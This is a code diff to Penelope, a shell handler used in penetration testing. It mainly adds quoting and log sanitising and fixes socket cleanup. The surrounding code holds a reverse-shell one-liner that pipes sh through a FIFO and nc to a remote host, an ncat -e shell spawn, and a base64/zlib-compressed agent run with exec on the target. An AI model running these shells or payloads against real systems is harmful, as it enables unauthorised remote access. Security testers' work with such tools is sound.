@@ -3749,15 +3749,15 @@ class Session:
 					_exec = 'exec cmd in globals(), locals()'
 
 				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
-					self.shell,
+					repr(self.shell),
 					options.network_buffer_size,
 					MESSENGER,
 					STREAM,
-					self.bin['sh'] or self.bin['bash'],
+					repr(self.bin['sh'] or self.bin['bash']),
 					_exec
 				)
 				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
-				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
+				cmd = f'{shlex.quote(_bin)} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
 				if self.pty_ready:
 					self.exec("stty -echo")
@@ -4846,8 +4846,9 @@ class Session:
 				elif self.bin['nc'] and self.bin['sh']:
 					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
 				elif self.bin['sh']:
-					ncat_cmd = f'{self.bin["sh"]} -c "{{}} -e {self.bin["sh"]} {host} {port} &"'
-					if not (self._ncat and not self.exec(f"test -x {self._ncat} || echo x")):
+					_q_sh = shlex.quote(self.bin["sh"])
+					ncat_cmd = f'{_q_sh} -c "{{}} -e {_q_sh} {host} {port} &"'
+					if not (self._ncat and not self.exec(f"test -x {shlex.quote(self._ncat)} || echo x")):
 						logger.warning("ncat is not available on the target")
 						if self.system == 'Linux' and self.arch == 'x86_64':
 							self._ncat = self.need_binary("ncat", URLS['ncat'])
@@ -4856,7 +4857,7 @@ class Session:
 					if not self._ncat:
 						logger.error("Spawning shell aborted")
 						return False
-					cmd = ncat_cmd.format(self._ncat)
+					cmd = ncat_cmd.format(shlex.quote(self._ncat))
 				else:
 					logger.error("No available shell binary is present...")
 					return False
@@ -5240,7 +5241,7 @@ def agent():
 		import StringIO
 		bufferclass = StringIO.StringIO
 
-	SHELL = "{}"
+	SHELL = {}
 	NET_BUF_SIZE = {}
 	{}
 	{}
@@ -5375,7 +5376,7 @@ def agent():
 									os.dup2(stdin_stream._read, 0)
 									os.dup2(stdout_stream._write, 1)
 									os.dup2(stderr_stream._write, 2)
-									os.execl("{}", "sh", "-c", cmd)
+									os.execl({}, "sh", "-c", cmd)
 									os._exit(1)
 								stdin_stream.close_read()
 								stdout_stream.close_write()
@@ -5786,9 +5787,9 @@ class uac(Module):
 			result = session.exec(f"tar xf {path} -C {shlex.quote(session.exec_tmp)} >/dev/null", value=True)
 			if not result:
 				session.exec(f"rm -f {path}")
-				logger.info(f"UAC successfully extracted on {session.exec_tmp}")
+				logger.info(f"UAC successfully extracted on {sanitize_meta(session.exec_tmp)}")
 			else:
-				logger.error(f"Extraction to {session.exec_tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
+				logger.error(f"Extraction to {sanitize_meta(session.exec_tmp)} failed:\n{indent(sanitize_meta(result), ' ' * 4 + '- ')}")
 				return False
 			# UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
 			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
@@ -5800,7 +5801,7 @@ class uac(Module):
 			with os.fdopen(fd, "w") as f:
 				f.write("#!/bin/sh\n")
 				f.write(cmd)
-			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
+			logger.info(f"UAC output will be stored at {sanitize_meta(session.tmp)}/uac-%hostname%-%os%-%timestamp%")
 			session.script(tf)
 			# Once completed, transfer the output files to your host
 		else:
@@ -5825,7 +5826,7 @@ class linux_procmemdump(Module):
 			logger.info(f"Please provide the PID of the process to be acquired:")
 			PID = input("PID: ")
 			session.exec(f"{shlex.quote(session.exec_tmp + '/linux_procmemdump.sh')} -p {PID} -s -d {shlex.quote(session.tmp)}")
-			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
+			logger.info(f"Strings of the process dump will be stored at {sanitize_meta(session.tmp)}/{PID}/")
 		else:
 			logger.error("This module runs only on Unix shells")
 
@@ -6201,7 +6202,7 @@ class FileServer:
 			block_on_close = False
 
 			def __init__(self, *args, **kwargs):
-				self.client_sockets = []
+				self.client_sockets = set()
 				super().__init__(*args, **kwargs)
 
 			@handle_bind_errors
@@ -6210,11 +6211,15 @@ class FileServer:
 				super().server_bind()
 
 			def process_request(self, request, client_address):
-				self.client_sockets.append(request)
+				self.client_sockets.add(request)
 				super().process_request(request, client_address)
 
+			def shutdown_request(self, request):
+				self.client_sockets.discard(request)
+				super().shutdown_request(request)
+
 			def shutdown(self):
-				for sock in self.client_sockets:
+				for sock in list(self.client_sockets):
 					try:
 						sock.shutdown(socket.SHUT_RDWR)
 						sock.close()
@@ -7364,6 +7369,9 @@ if not sys.version_info >= (3, 6):
 	print("(!) Penelope requires Python version 3.6 or higher (!)")
 	sys.exit(1)
 
+# Set umask
+os.umask(0o007)
+
 # Store initial TTY settings
 try:
 	TTY_NORMAL = termios.tcgetattr(sys.stdin)
@@ -7406,12 +7414,12 @@ stdout_handler = logging.StreamHandler()
 stdout_handler.setFormatter(CustomFormatter())
 stdout_handler.terminator = ''
 
-file_handler = logging.FileHandler(options.logfile, encoding='utf-8', errors='replace')
+file_handler = logging.FileHandler(options.logfile, encoding='utf-8')
 file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
 file_handler.setLevel(logging.INFO)
 file_handler.terminator = ''
 
-debug_file_handler = logging.FileHandler(options.debug_logfile, encoding='utf-8', errors='replace')
+debug_file_handler = logging.FileHandler(options.debug_logfile, encoding='utf-8')
 debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
 debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
 debug_file_handler.terminator = ''
@@ -7522,7 +7530,6 @@ input = my_input
 sys.excepthook = custom_excepthook
 threading.excepthook = custom_excepthook
 tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
-os.umask(0o007)
 signal.signal(signal.SIGWINCH, WinResize)
 keyboard_interrupt = signal.getsignal(signal.SIGINT)
 try:
